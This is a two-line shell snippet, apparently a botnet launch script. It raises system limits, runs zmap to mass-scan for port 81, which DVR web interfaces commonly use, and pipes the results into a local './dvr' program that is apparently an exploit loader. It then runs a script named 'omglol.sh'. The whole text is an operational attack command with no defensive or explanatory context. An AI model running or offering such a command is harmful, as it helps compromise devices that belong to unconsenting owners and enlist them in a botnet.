ulimit -n 999999;ulimit -u999999; zmap -p 81 -o- | ./dvr
sh omglol.sh